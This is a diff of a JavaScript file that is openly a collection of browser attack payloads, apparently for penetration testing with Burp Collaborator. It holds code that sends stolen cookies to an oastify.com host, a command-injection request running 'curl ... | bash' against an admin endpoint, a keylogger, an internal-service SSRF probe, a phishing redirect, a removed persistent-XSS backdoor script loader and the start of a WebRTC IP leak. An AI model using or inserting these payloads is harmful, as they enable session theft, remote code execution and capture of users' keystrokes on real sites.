@@ -3,7 +3,7 @@ alert("Domain: " + document.domain);
 
 // Steal cookies and send to attacker server
 var cookies = document.cookie;
-var burpCollaboratorURL = "http://wkkfbhjw2qf24kfmkj22wg4yapgg488wx.oastify.com";
+var burpCollaboratorURL = "http://211lsn02jww8lqws1pj8dml4rvxmleq2f.oastify.com";
 var img = new Image();
 img.src = burpCollaboratorURL + "/?cookie=" + encodeURIComponent(cookies);
 
@@ -30,7 +30,7 @@ var img = new Image();
 img.src = "http://internal-service.local/?test=1";
 
 // RCE via vulnerable command injection endpoint
-fetch('/admin?cmd=' + encodeURIComponent('curl http://your-server.com | bash'));
+fetch('/admin?cmd=' + encodeURIComponent('curl http://211lsn02jww8lqws1pj8dml4rvxmleq2f.oastify.com | bash'));
 
 // Keylogging attack
 document.addEventListener('keydown', function(e) {
@@ -38,11 +38,7 @@ document.addEventListener('keydown', function(e) {
 });
 
 // Redirect users to phishing page
-window.location.href = "https://phishing-site.com/login";
-
-// Persistent XSS via DOM manipulation
-localStorage.setItem('xss', '<script src="https://your-server.com/backdoor.js"></script>');
-document.body.innerHTML += localStorage.getItem('xss');
+window.location.href = "https://bing.com/";
 
 // WebRTC IP Leak
 var peer = new RTCPeerConnection({iceServers:[]});
